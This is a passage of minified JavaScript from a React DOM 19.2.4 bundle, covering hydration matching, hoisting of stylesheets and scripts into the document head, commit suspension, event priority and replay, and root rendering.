        if (n.nodeType === 1 ? e ? (n._stashedDisplay = n.style.display, n.style.display = "none") : (n.style.display = n._stashedDisplay || "", n.getAttribute("style") === "" && n.removeAttribute("style")) : n.nodeType === 3 && (e ? (n._stashedText = n.nodeValue, n.nodeValue = "") : n.nodeValue = n._stashedText || ""), l && l.nodeType === 8) if (n = l.data, n === "/$") {
          if (t === 0) break;
          t--;
        } else n !== "$" && n !== "$?" && n !== "$~" && n !== "$!" || t++;
        n = l;
      } while (n);
    }
    function Dr(t) {
      var e = t.firstChild;
      for (e && e.nodeType === 10 && (e = e.nextSibling); e; ) {
        var n = e;
        switch (e = e.nextSibling, n.nodeName) {
          case "HTML":
          case "HEAD":
          case "BODY":
            Dr(n), wf(n);
            continue;
          case "SCRIPT":
          case "STYLE":
            continue;
          case "LINK":
            if (n.rel.toLowerCase() === "stylesheet") continue;
        }
        t.removeChild(n);
      }
    }
    function $2(t, e, n, l) {
      for (; t.nodeType === 1; ) {
        var a = n;
        if (t.nodeName.toLowerCase() !== e.toLowerCase()) {
          if (!l && (t.nodeName !== "INPUT" || t.type !== "hidden")) break;
        } else if (l) {
          if (!t[ku]) switch (e) {
            case "meta":
              if (!t.hasAttribute("itemprop")) break;
              return t;
            case "link":
              if (i = t.getAttribute("rel"), i === "stylesheet" && t.hasAttribute("data-precedence")) break;
              if (i !== a.rel || t.getAttribute("href") !== (a.href == null || a.href === "" ? null : a.href) || t.getAttribute("crossorigin") !== (a.crossOrigin == null ? null : a.crossOrigin) || t.getAttribute("title") !== (a.title == null ? null : a.title)) break;
              return t;
            case "style":
              if (t.hasAttribute("data-precedence")) break;
              return t;
            case "script":
              if (i = t.getAttribute("src"), (i !== (a.src == null ? null : a.src) || t.getAttribute("type") !== (a.type == null ? null : a.type) || t.getAttribute("crossorigin") !== (a.crossOrigin == null ? null : a.crossOrigin)) && i && t.hasAttribute("async") && !t.hasAttribute("itemprop")) break;
              return t;
            default:
              return t;
          }
        } else if (e === "input" && t.type === "hidden") {
          var i = a.name == null ? null : "" + a.name;
          if (a.type === "hidden" && t.getAttribute("name") === i) return t;
        } else return t;
        if (t = Qe(t.nextSibling), t === null) break;
      }
      return null;
    }
    function P2(t, e, n) {
      if (e === "") return null;
      for (; t.nodeType !== 3; ) if ((t.nodeType !== 1 || t.nodeName !== "INPUT" || t.type !== "hidden") && !n || (t = Qe(t.nextSibling), t === null)) return null;
      return t;
    }
    function $1(t, e) {
      for (; t.nodeType !== 8; ) if ((t.nodeType !== 1 || t.nodeName !== "INPUT" || t.type !== "hidden") && !e || (t = Qe(t.nextSibling), t === null)) return null;
      return t;
    }
    function Br(t) {
      return t.data === "$?" || t.data === "$~";
    }
    function zr(t) {
      return t.data === "$!" || t.data === "$?" && t.ownerDocument.readyState !== "loading";
    }
    function W2(t, e) {
      var n = t.ownerDocument;
      if (t.data === "$~") t._reactRetry = e;
      else if (t.data !== "$?" || n.readyState !== "loading") e();
      else {
        var l = function() {
          e(), n.removeEventListener("DOMContentLoaded", l);
        };
        n.addEventListener("DOMContentLoaded", l), t._reactRetry = l;
      }
    }
    function Qe(t) {
      for (; t != null; t = t.nextSibling) {
        var e = t.nodeType;
        if (e === 1 || e === 3) break;
        if (e === 8) {
          if (e = t.data, e === "$" || e === "$!" || e === "$?" || e === "$~" || e === "&" || e === "F!" || e === "F") break;
          if (e === "/$" || e === "/&") return null;
        }
      }
      return t;
    }
    var Mr = null;
    function P1(t) {
      t = t.nextSibling;
      for (var e = 0; t; ) {
        if (t.nodeType === 8) {
          var n = t.data;
          if (n === "/$" || n === "/&") {
            if (e === 0) return Qe(t.nextSibling);
            e--;
          } else n !== "$" && n !== "$!" && n !== "$?" && n !== "$~" && n !== "&" || e++;
        }
        t = t.nextSibling;
      }
      return null;
    }
    function W1(t) {
      t = t.previousSibling;
      for (var e = 0; t; ) {
        if (t.nodeType === 8) {
          var n = t.data;
          if (n === "$" || n === "$!" || n === "$?" || n === "$~" || n === "&") {
            if (e === 0) return t;
            e--;
          } else n !== "/$" && n !== "/&" || e++;
        }
        t = t.previousSibling;
      }
      return null;
    }
    function th(t, e, n) {
      switch (e = Wi(n), t) {
        case "html":
          if (t = e.documentElement, !t) throw Error(c(452));
          return t;
        case "head":
          if (t = e.head, !t) throw Error(c(453));
          return t;
        case "body":
          if (t = e.body, !t) throw Error(c(454));
          return t;
        default:
          throw Error(c(451));
      }
    }
    function za(t) {
      for (var e = t.attributes; e.length; ) t.removeAttributeNode(e[0]);
      wf(t);
    }
    var Ve = /* @__PURE__ */ new Map(), eh = /* @__PURE__ */ new Set();
    function tf(t) {
      return typeof t.getRootNode == "function" ? t.getRootNode() : t.nodeType === 9 ? t : t.ownerDocument;
    }
    var Ln = K.d;
    K.d = {
      f: tm,
      r: em,
      D: nm,
      C: lm,
      L: um,
      m: am,
      X: fm,
      S: im,
      M: cm
    };
    function tm() {
      var t = Ln.f(), e = Vi();
      return t || e;
    }
    function em(t) {
      var e = eu(t);
      e !== null && e.tag === 5 && e.type === "form" ? ps(e) : Ln.r(t);
    }
    var Mu = typeof document > "u" ? null : document;
    function nh(t, e, n) {
      var l = Mu;
      if (l && typeof e == "string" && e) {
        var a = Le(e);
        a = 'link[rel="' + t + '"][href="' + a + '"]', typeof n == "string" && (a += '[crossorigin="' + n + '"]'), eh.has(a) || (eh.add(a), t = {
          rel: t,
          crossOrigin: n,
          href: e
        }, l.querySelector(a) === null && (e = l.createElement("link"), oe(e, "link", t), le(e), l.head.appendChild(e)));
      }
    }
    function nm(t) {
      Ln.D(t), nh("dns-prefetch", t, null);
    }
    function lm(t, e) {
      Ln.C(t, e), nh("preconnect", t, e);
    }
    function um(t, e, n) {
      Ln.L(t, e, n);
      var l = Mu;
      if (l && t && e) {
        var a = 'link[rel="preload"][as="' + Le(e) + '"]';
        e === "image" && n && n.imageSrcSet ? (a += '[imagesrcset="' + Le(n.imageSrcSet) + '"]', typeof n.imageSizes == "string" && (a += '[imagesizes="' + Le(n.imageSizes) + '"]')) : a += '[href="' + Le(t) + '"]';
        var i = a;
        switch (e) {
          case "style":
            i = Cu(t);
            break;
          case "script":
            i = wu(t);
        }
        Ve.has(i) || (t = B({
          rel: "preload",
          href: e === "image" && n && n.imageSrcSet ? void 0 : t,
          as: e
        }, n), Ve.set(i, t), l.querySelector(a) !== null || e === "style" && l.querySelector(Ma(i)) || e === "script" && l.querySelector(Ca(i)) || (e = l.createElement("link"), oe(e, "link", t), le(e), l.head.appendChild(e)));
      }
    }
    function am(t, e) {
      Ln.m(t, e);
      var n = Mu;
      if (n && t) {
        var l = e && typeof e.as == "string" ? e.as : "script", a = 'link[rel="modulepreload"][as="' + Le(l) + '"][href="' + Le(t) + '"]', i = a;
        switch (l) {
          case "audioworklet":
          case "paintworklet":
          case "serviceworker":
          case "sharedworker":
          case "worker":
          case "script":
            i = wu(t);
        }
        if (!Ve.has(i) && (t = B({
          rel: "modulepreload",
          href: t
        }, e), Ve.set(i, t), n.querySelector(a) === null)) {
          switch (l) {
            case "audioworklet":
            case "paintworklet":
            case "serviceworker":
            case "sharedworker":
            case "worker":
            case "script":
              if (n.querySelector(Ca(i))) return;
          }
          l = n.createElement("link"), oe(l, "link", t), le(l), n.head.appendChild(l);
        }
      }
    }
    function im(t, e, n) {
      Ln.S(t, e, n);
      var l = Mu;
      if (l && t) {
        var a = nu(l).hoistableStyles, i = Cu(t);
        e = e || "default";
        var h = a.get(i);
        if (!h) {
          var d = {
            loading: 0,
            preload: null
          };
          if (h = l.querySelector(Ma(i))) d.loading = 5;
          else {
            t = B({
              rel: "stylesheet",
              href: t,
              "data-precedence": e
            }, n), (n = Ve.get(i)) && Cr(t, n);
            var _ = h = l.createElement("link");
            le(_), oe(_, "link", t), _._p = new Promise(function(R, w) {
              _.onload = R, _.onerror = w;
            }), _.addEventListener("load", function() {
              d.loading |= 1;
            }), _.addEventListener("error", function() {
              d.loading |= 2;
            }), d.loading |= 4, ef(h, e, l);
          }
          h = {
            type: "stylesheet",
            instance: h,
            count: 1,
            state: d
          }, a.set(i, h);
        }
      }
    }
    function fm(t, e) {
      Ln.X(t, e);
      var n = Mu;
      if (n && t) {
        var l = nu(n).hoistableScripts, a = wu(t), i = l.get(a);
        i || (i = n.querySelector(Ca(a)), i || (t = B({
          src: t,
          async: true
        }, e), (e = Ve.get(a)) && wr(t, e), i = n.createElement("script"), le(i), oe(i, "link", t), n.head.appendChild(i)), i = {
          type: "script",
          instance: i,
          count: 1,
          state: null
        }, l.set(a, i));
      }
    }
    function cm(t, e) {
      Ln.M(t, e);
      var n = Mu;
      if (n && t) {
        var l = nu(n).hoistableScripts, a = wu(t), i = l.get(a);
        i || (i = n.querySelector(Ca(a)), i || (t = B({
          src: t,
          async: true,
          type: "module"
        }, e), (e = Ve.get(a)) && wr(t, e), i = n.createElement("script"), le(i), oe(i, "link", t), n.head.appendChild(i)), i = {
          type: "script",
          instance: i,
          count: 1,
          state: null
        }, l.set(a, i));
      }
    }
    function lh(t, e, n, l) {
      var a = (a = ct.current) ? tf(a) : null;
      if (!a) throw Error(c(446));
      switch (t) {
        case "meta":
        case "title":
          return null;
        case "style":
          return typeof n.precedence == "string" && typeof n.href == "string" ? (e = Cu(n.href), n = nu(a).hoistableStyles, l = n.get(e), l || (l = {
            type: "style",
            instance: null,
            count: 0,
            state: null
          }, n.set(e, l)), l) : {
            type: "void",
            instance: null,
            count: 0,
            state: null
          };
        case "link":
          if (n.rel === "stylesheet" && typeof n.href == "string" && typeof n.precedence == "string") {
            t = Cu(n.href);
            var i = nu(a).hoistableStyles, h = i.get(t);
            if (h || (a = a.ownerDocument || a, h = {
              type: "stylesheet",
              instance: null,
              count: 0,
              state: {
                loading: 0,
                preload: null
              }
            }, i.set(t, h), (i = a.querySelector(Ma(t))) && !i._p && (h.instance = i, h.state.loading = 5), Ve.has(t) || (n = {
              rel: "preload",
              as: "style",
              href: n.href,
              crossOrigin: n.crossOrigin,
              integrity: n.integrity,
              media: n.media,
              hrefLang: n.hrefLang,
              referrerPolicy: n.referrerPolicy
            }, Ve.set(t, n), i || rm(a, t, n, h.state))), e && l === null) throw Error(c(528, ""));
            return h;
          }
          if (e && l !== null) throw Error(c(529, ""));
          return null;
        case "script":
          return e = n.async, n = n.src, typeof n == "string" && e && typeof e != "function" && typeof e != "symbol" ? (e = wu(n), n = nu(a).hoistableScripts, l = n.get(e), l || (l = {
            type: "script",
            instance: null,
            count: 0,
            state: null
          }, n.set(e, l)), l) : {
            type: "void",
            instance: null,
            count: 0,
            state: null
          };
        default:
          throw Error(c(444, t));
      }
    }
    function Cu(t) {
      return 'href="' + Le(t) + '"';
    }
    function Ma(t) {
      return 'link[rel="stylesheet"][' + t + "]";
    }
    function uh(t) {
      return B({}, t, {
        "data-precedence": t.precedence,
        precedence: null
      });
    }
    function rm(t, e, n, l) {
      t.querySelector('link[rel="preload"][as="style"][' + e + "]") ? l.loading = 1 : (e = t.createElement("link"), l.preload = e, e.addEventListener("load", function() {
        return l.loading |= 1;
      }), e.addEventListener("error", function() {
        return l.loading |= 2;
      }), oe(e, "link", n), le(e), t.head.appendChild(e));
    }
    function wu(t) {
      return '[src="' + Le(t) + '"]';
    }
    function Ca(t) {
      return "script[async]" + t;
    }
    function ah(t, e, n) {
      if (e.count++, e.instance === null) switch (e.type) {
        case "style":
          var l = t.querySelector('style[data-href~="' + Le(n.href) + '"]');
          if (l) return e.instance = l, le(l), l;
          var a = B({}, n, {
            "data-href": n.href,
            "data-precedence": n.precedence,
            href: null,
            precedence: null
          });
          return l = (t.ownerDocument || t).createElement("style"), le(l), oe(l, "style", a), ef(l, n.precedence, t), e.instance = l;
        case "stylesheet":
          a = Cu(n.href);
          var i = t.querySelector(Ma(a));
          if (i) return e.state.loading |= 4, e.instance = i, le(i), i;
          l = uh(n), (a = Ve.get(a)) && Cr(l, a), i = (t.ownerDocument || t).createElement("link"), le(i);
          var h = i;
          return h._p = new Promise(function(d, _) {
            h.onload = d, h.onerror = _;
          }), oe(i, "link", l), e.state.loading |= 4, ef(i, n.precedence, t), e.instance = i;
        case "script":
          return i = wu(n.src), (a = t.querySelector(Ca(i))) ? (e.instance = a, le(a), a) : (l = n, (a = Ve.get(i)) && (l = B({}, n), wr(l, a)), t = t.ownerDocument || t, a = t.createElement("script"), le(a), oe(a, "link", l), t.head.appendChild(a), e.instance = a);
        case "void":
          return null;
        default:
          throw Error(c(443, e.type));
      }
      else e.type === "stylesheet" && (e.state.loading & 4) === 0 && (l = e.instance, e.state.loading |= 4, ef(l, n.precedence, t));
      return e.instance;
    }
    function ef(t, e, n) {
      for (var l = n.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'), a = l.length ? l[l.length - 1] : null, i = a, h = 0; h < l.length; h++) {
        var d = l[h];
        if (d.dataset.precedence === e) i = d;
        else if (i !== a) break;
      }
      i ? i.parentNode.insertBefore(t, i.nextSibling) : (e = n.nodeType === 9 ? n.head : n, e.insertBefore(t, e.firstChild));
    }
    function Cr(t, e) {
      t.crossOrigin == null && (t.crossOrigin = e.crossOrigin), t.referrerPolicy == null && (t.referrerPolicy = e.referrerPolicy), t.title == null && (t.title = e.title);
    }
    function wr(t, e) {
      t.crossOrigin == null && (t.crossOrigin = e.crossOrigin), t.referrerPolicy == null && (t.referrerPolicy = e.referrerPolicy), t.integrity == null && (t.integrity = e.integrity);
    }
    var nf = null;
    function ih(t, e, n) {
      if (nf === null) {
        var l = /* @__PURE__ */ new Map(), a = nf = /* @__PURE__ */ new Map();
        a.set(n, l);
      } else a = nf, l = a.get(n), l || (l = /* @__PURE__ */ new Map(), a.set(n, l));
      if (l.has(t)) return l;
      for (l.set(t, null), n = n.getElementsByTagName(t), a = 0; a < n.length; a++) {
        var i = n[a];
        if (!(i[ku] || i[ie] || t === "link" && i.getAttribute("rel") === "stylesheet") && i.namespaceURI !== "http://www.w3.org/2000/svg") {
          var h = i.getAttribute(e) || "";
          h = t + h;
          var d = l.get(h);
          d ? d.push(i) : l.set(h, [
            i
          ]);
        }
      }
      return l;
    }
    function fh(t, e, n) {
      t = t.ownerDocument || t, t.head.insertBefore(n, e === "title" ? t.querySelector("head > title") : null);
    }
    function om(t, e, n) {
      if (n === 1 || e.itemProp != null) return false;
      switch (t) {
        case "meta":
        case "title":
          return true;
        case "style":
          if (typeof e.precedence != "string" || typeof e.href != "string" || e.href === "") break;
          return true;
        case "link":
          if (typeof e.rel != "string" || typeof e.href != "string" || e.href === "" || e.onLoad || e.onError) break;
          return e.rel === "stylesheet" ? (t = e.disabled, typeof e.precedence == "string" && t == null) : true;
        case "script":
          if (e.async && typeof e.async != "function" && typeof e.async != "symbol" && !e.onLoad && !e.onError && e.src && typeof e.src == "string") return true;
      }
      return false;
    }
    function ch(t) {
      return !(t.type === "stylesheet" && (t.state.loading & 3) === 0);
    }
    function sm(t, e, n, l) {
      if (n.type === "stylesheet" && (typeof l.media != "string" || matchMedia(l.media).matches !== false) && (n.state.loading & 4) === 0) {
        if (n.instance === null) {
          var a = Cu(l.href), i = e.querySelector(Ma(a));
          if (i) {
            e = i._p, e !== null && typeof e == "object" && typeof e.then == "function" && (t.count++, t = lf.bind(t), e.then(t, t)), n.state.loading |= 4, n.instance = i, le(i);
            return;
          }
          i = e.ownerDocument || e, l = uh(l), (a = Ve.get(a)) && Cr(l, a), i = i.createElement("link"), le(i);
          var h = i;
          h._p = new Promise(function(d, _) {
            h.onload = d, h.onerror = _;
          }), oe(i, "link", l), n.instance = i;
        }
        t.stylesheets === null && (t.stylesheets = /* @__PURE__ */ new Map()), t.stylesheets.set(n, e), (e = n.state.preload) && (n.state.loading & 3) === 0 && (t.count++, n = lf.bind(t), e.addEventListener("load", n), e.addEventListener("error", n));
      }
    }
    var Hr = 0;
    function hm(t, e) {
      return t.stylesheets && t.count === 0 && af(t, t.stylesheets), 0 < t.count || 0 < t.imgCount ? function(n) {
        var l = setTimeout(function() {
          if (t.stylesheets && af(t, t.stylesheets), t.unsuspend) {
            var i = t.unsuspend;
            t.unsuspend = null, i();
          }
        }, 6e4 + e);
        0 < t.imgBytes && Hr === 0 && (Hr = 62500 * Z2());
        var a = setTimeout(function() {
          if (t.waitingForImages = false, t.count === 0 && (t.stylesheets && af(t, t.stylesheets), t.unsuspend)) {
            var i = t.unsuspend;
            t.unsuspend = null, i();
          }
        }, (t.imgBytes > Hr ? 50 : 800) + e);
        return t.unsuspend = n, function() {
          t.unsuspend = null, clearTimeout(l), clearTimeout(a);
        };
      } : null;
    }
    function lf() {
      if (this.count--, this.count === 0 && (this.imgCount === 0 || !this.waitingForImages)) {
        if (this.stylesheets) af(this, this.stylesheets);
        else if (this.unsuspend) {
          var t = this.unsuspend;
          this.unsuspend = null, t();
        }
      }
    }
    var uf = null;
    function af(t, e) {
      t.stylesheets = null, t.unsuspend !== null && (t.count++, uf = /* @__PURE__ */ new Map(), e.forEach(dm, t), uf = null, lf.call(t));
    }
    function dm(t, e) {
      if (!(e.state.loading & 4)) {
        var n = uf.get(t);
        if (n) var l = n.get(null);
        else {
          n = /* @__PURE__ */ new Map(), uf.set(t, n);
          for (var a = t.querySelectorAll("link[data-precedence],style[data-precedence]"), i = 0; i < a.length; i++) {
            var h = a[i];
            (h.nodeName === "LINK" || h.getAttribute("media") !== "not all") && (n.set(h.dataset.precedence, h), l = h);
          }
          l && n.set(null, l);
        }
        a = e.instance, h = a.getAttribute("data-precedence"), i = n.get(h) || l, i === l && n.set(null, a), n.set(h, a), this.count++, l = lf.bind(this), a.addEventListener("load", l), a.addEventListener("error", l), i ? i.parentNode.insertBefore(a, i.nextSibling) : (t = t.nodeType === 9 ? t.head : t, t.insertBefore(a, t.firstChild)), e.state.loading |= 4;
      }
    }
    var wa = {
      $$typeof: lt,
      Provider: null,
      Consumer: null,
      _currentValue: P,
      _currentValue2: P,
      _threadCount: 0
    };
    function ym(t, e, n, l, a, i, h, d, _) {
      this.tag = 1, this.containerInfo = t, this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.next = this.pendingContext = this.context = this.cancelPendingCommit = null, this.callbackPriority = 0, this.expirationTimes = Bf(-1), this.entangledLanes = this.shellSuspendCounter = this.errorRecoveryDisabledLanes = this.expiredLanes = this.warmLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = Bf(0), this.hiddenUpdates = Bf(null), this.identifierPrefix = l, this.onUncaughtError = a, this.onCaughtError = i, this.onRecoverableError = h, this.pooledCache = null, this.pooledCacheLanes = 0, this.formState = _, this.incompleteTransitions = /* @__PURE__ */ new Map();
    }
    function rh(t, e, n, l, a, i, h, d, _, R, w, Y) {
      return t = new ym(t, e, n, h, _, R, w, Y, d), e = 1, i === true && (e |= 24), i = Oe(3, null, null, e), t.current = i, i.stateNode = t, e = mc(), e.refCount++, t.pooledCache = e, e.refCount++, i.memoizedState = {
        element: l,
        isDehydrated: n,
        cache: e
      }, Ec(i), t;
    }
    function oh(t) {
      return t ? (t = hu, t) : hu;
    }
    function sh(t, e, n, l, a, i) {
      a = oh(a), l.context === null ? l.context = a : l.pendingContext = a, l = $n(e), l.payload = {
        element: n
      }, i = i === void 0 ? null : i, i !== null && (l.callback = i), n = Pn(t, l, e), n !== null && (Ae(n, t, e), da(n, t, e));
    }
    function hh(t, e) {
      if (t = t.memoizedState, t !== null && t.dehydrated !== null) {
        var n = t.retryLane;
        t.retryLane = n !== 0 && n < e ? n : e;
      }
    }
    function Lr(t, e) {
      hh(t, e), (t = t.alternate) && hh(t, e);
    }
    function dh(t) {
      if (t.tag === 13 || t.tag === 31) {
        var e = Bl(t, 67108864);
        e !== null && Ae(e, t, 67108864), Lr(t, 67108864);
      }
    }
    function yh(t) {
      if (t.tag === 13 || t.tag === 31) {
        var e = ze();
        e = zf(e);
        var n = Bl(t, e);
        n !== null && Ae(n, t, e), Lr(t, e);
      }
    }
    var ff = true;
    function mm(t, e, n, l) {
      var a = H.T;
      H.T = null;
      var i = K.p;
      try {
        K.p = 2, Yr(t, e, n, l);
      } finally {
        K.p = i, H.T = a;
      }
    }
    function gm(t, e, n, l) {
      var a = H.T;
      H.T = null;
      var i = K.p;
      try {
        K.p = 8, Yr(t, e, n, l);
      } finally {
        K.p = i, H.T = a;
      }
    }
    function Yr(t, e, n, l) {
      if (ff) {
        var a = Gr(l);
        if (a === null) Sr(t, e, l, cf, n), gh(t, l);
        else if (pm(a, t, e, n, l)) l.stopPropagation();
        else if (gh(t, l), e & 4 && -1 < vm.indexOf(t)) {
          for (; a !== null; ) {
            var i = eu(a);
            if (i !== null) switch (i.tag) {
              case 3:
                if (i = i.stateNode, i.current.memoizedState.isDehydrated) {
                  var h = xl(i.pendingLanes);
                  if (h !== 0) {
                    var d = i;
                    for (d.pendingLanes |= 2, d.entangledLanes |= 2; h; ) {
                      var _ = 1 << 31 - C(h);
                      d.entanglements[1] |= _, h &= ~_;
                    }
                    on(i), (At & 6) === 0 && (Ki = ne() + 500, Ra(0));
                  }
                }
                break;
              case 31:
              case 13:
                d = Bl(i, 2), d !== null && Ae(d, i, 2), Vi(), Lr(i, 2);
            }
            if (i = Gr(l), i === null && Sr(t, e, l, cf, n), i === a) break;
            a = i;
          }
          a !== null && l.stopPropagation();
        } else Sr(t, e, l, null, n);
      }
    }
    function Gr(t) {
      return t = jf(t), qr(t);
    }
    var cf = null;
    function qr(t) {
      if (cf = null, t = tu(t), t !== null) {
        var e = b(t);
        if (e === null) t = null;
        else {
          var n = e.tag;
          if (n === 13) {
            if (t = p(e), t !== null) return t;
            t = null;
          } else if (n === 31) {
            if (t = x(e), t !== null) return t;
            t = null;
          } else if (n === 3) {
            if (e.stateNode.current.memoizedState.isDehydrated) return e.tag === 3 ? e.stateNode.containerInfo : null;
            t = null;
          } else e !== t && (t = null);
        }
      }
      return cf = t, null;
    }
    function mh(t) {
      switch (t) {
        case "beforetoggle":
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "toggle":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
          return 2;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
          return 8;
        case "message":
          switch (we()) {
            case Pl:
              return 2;
            case Pa:
              return 8;
            case Ue:
            case Df:
              return 32;
            case y:
              return 268435456;
            default:
              return 32;
          }
        default:
          return 32;
      }
    }
    var jr = false, rl = null, ol = null, sl = null, Ha = /* @__PURE__ */ new Map(), La = /* @__PURE__ */ new Map(), hl = [], vm = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");
    function gh(t, e) {
      switch (t) {
        case "focusin":
        case "focusout":
          rl = null;
          break;
        case "dragenter":
        case "dragleave":
          ol = null;
          break;
        case "mouseover":
        case "mouseout":
          sl = null;
          break;
        case "pointerover":
        case "pointerout":
          Ha.delete(e.pointerId);
          break;
        case "gotpointercapture":
        case "lostpointercapture":
          La.delete(e.pointerId);
      }
    }
    function Ya(t, e, n, l, a, i) {
      return t === null || t.nativeEvent !== i ? (t = {
        blockedOn: e,
        domEventName: n,
        eventSystemFlags: l,
        nativeEvent: i,
        targetContainers: [
          a
        ]
      }, e !== null && (e = eu(e), e !== null && dh(e)), t) : (t.eventSystemFlags |= l, e = t.targetContainers, a !== null && e.indexOf(a) === -1 && e.push(a), t);
    }
    function pm(t, e, n, l, a) {
      switch (e) {
        case "focusin":
          return rl = Ya(rl, t, e, n, l, a), true;
        case "dragenter":
          return ol = Ya(ol, t, e, n, l, a), true;
        case "mouseover":
          return sl = Ya(sl, t, e, n, l, a), true;
        case "pointerover":
          var i = a.pointerId;
          return Ha.set(i, Ya(Ha.get(i) || null, t, e, n, l, a)), true;
        case "gotpointercapture":
          return i = a.pointerId, La.set(i, Ya(La.get(i) || null, t, e, n, l, a)), true;
      }
      return false;
    }
    function vh(t) {
      var e = tu(t.target);
      if (e !== null) {
        var n = b(e);
        if (n !== null) {
          if (e = n.tag, e === 13) {
            if (e = p(n), e !== null) {
              t.blockedOn = e, D0(t.priority, function() {
                yh(n);
              });
              return;
            }
          } else if (e === 31) {
            if (e = x(n), e !== null) {
              t.blockedOn = e, D0(t.priority, function() {
                yh(n);
              });
              return;
            }
          } else if (e === 3 && n.stateNode.current.memoizedState.isDehydrated) {
            t.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
            return;
          }
        }
      }
      t.blockedOn = null;
    }
    function rf(t) {
      if (t.blockedOn !== null) return false;
      for (var e = t.targetContainers; 0 < e.length; ) {
        var n = Gr(t.nativeEvent);
        if (n === null) {
          n = t.nativeEvent;
          var l = new n.constructor(n.type, n);
          qf = l, n.target.dispatchEvent(l), qf = null;
        } else return e = eu(n), e !== null && dh(e), t.blockedOn = n, false;
        e.shift();
      }
      return true;
    }
    function ph(t, e, n) {
      rf(t) && n.delete(e);
    }
    function Em() {
      jr = false, rl !== null && rf(rl) && (rl = null), ol !== null && rf(ol) && (ol = null), sl !== null && rf(sl) && (sl = null), Ha.forEach(ph), La.forEach(ph);
    }
    function of(t, e) {
      t.blockedOn === e && (t.blockedOn = null, jr || (jr = true, u.unstable_scheduleCallback(u.unstable_NormalPriority, Em)));
    }
    var sf = null;
    function Eh(t) {
      sf !== t && (sf = t, u.unstable_scheduleCallback(u.unstable_NormalPriority, function() {
        sf === t && (sf = null);
        for (var e = 0; e < t.length; e += 3) {
          var n = t[e], l = t[e + 1], a = t[e + 2];
          if (typeof l != "function") {
            if (qr(l || n) === null) continue;
            break;
          }
          var i = eu(n);
          i !== null && (t.splice(e, 3), e -= 3, Gc(i, {
            pending: true,
            data: a,
            method: n.method,
            action: l
          }, l, a));
        }
      }));
    }
    function Hu(t) {
      function e(_) {
        return of(_, t);
      }
      rl !== null && of(rl, t), ol !== null && of(ol, t), sl !== null && of(sl, t), Ha.forEach(e), La.forEach(e);
      for (var n = 0; n < hl.length; n++) {
        var l = hl[n];
        l.blockedOn === t && (l.blockedOn = null);
      }
      for (; 0 < hl.length && (n = hl[0], n.blockedOn === null); ) vh(n), n.blockedOn === null && hl.shift();
      if (n = (t.ownerDocument || t).$$reactFormReplay, n != null) for (l = 0; l < n.length; l += 3) {
        var a = n[l], i = n[l + 1], h = a[ge] || null;
        if (typeof i == "function") h || Eh(n);
        else if (h) {
          var d = null;
          if (i && i.hasAttribute("formAction")) {
            if (a = i, h = i[ge] || null) d = h.formAction;
            else if (qr(a) !== null) continue;
          } else d = h.action;
          typeof d == "function" ? n[l + 1] = d : (n.splice(l, 3), l -= 3), Eh(n);
        }
      }
    }
    function bh() {
      function t(i) {
        i.canIntercept && i.info === "react-transition" && i.intercept({
          handler: function() {
            return new Promise(function(h) {
              return a = h;
            });
          },
          focusReset: "manual",
          scroll: "manual"
        });
      }
      function e() {
        a !== null && (a(), a = null), l || setTimeout(n, 20);
      }
      function n() {
        if (!l && !navigation.transition) {
          var i = navigation.currentEntry;
          i && i.url != null && navigation.navigate(i.url, {
            state: i.getState(),
            info: "react-transition",
            history: "replace"
          });
        }
      }
      if (typeof navigation == "object") {
        var l = false, a = null;
        return navigation.addEventListener("navigate", t), navigation.addEventListener("navigatesuccess", e), navigation.addEventListener("navigateerror", e), setTimeout(n, 100), function() {
          l = true, navigation.removeEventListener("navigate", t), navigation.removeEventListener("navigatesuccess", e), navigation.removeEventListener("navigateerror", e), a !== null && (a(), a = null);
        };
      }
    }
    function Xr(t) {
      this._internalRoot = t;
    }
    hf.prototype.render = Xr.prototype.render = function(t) {
      var e = this._internalRoot;
      if (e === null) throw Error(c(409));
      var n = e.current, l = ze();
      sh(n, l, t, e, null, null);
    }, hf.prototype.unmount = Xr.prototype.unmount = function() {
      var t = this._internalRoot;
      if (t !== null) {
        this._internalRoot = null;
        var e = t.containerInfo;
        sh(t.current, 2, null, t, null, null), Vi(), e[Wl] = null;
      }
    };
    function hf(t) {
      this._internalRoot = t;
    }
    hf.prototype.unstable_scheduleHydration = function(t) {
      if (t) {
        var e = R0();
        t = {
          blockedOn: null,
          target: t,
          priority: e
        };
        for (var n = 0; n < hl.length && e !== 0 && e < hl[n].priority; n++) ;
        hl.splice(n, 0, t), n === 0 && vh(t);
      }
    };
    var _h = f.version;
    if (_h !== "19.2.4") throw Error(c(527, _h, "19.2.4"));
    K.findDOMNode = function(t) {
      var e = t._reactInternals;
      if (e === void 0) throw typeof t.render == "function" ? Error(c(188)) : (t = Object.keys(t).join(","), Error(c(268, t)));
      return t = v(e), t = t !== null ? m(t) : null, t = t === null ? null : t.stateNode, t;
    };
    var bm = {
      bundleType: 0,
      version: "19.2.4",
      rendererPackageName: "react-dom",
      currentDispatcherRef: H,
      reconcilerVersion: "19.2.4"
    };
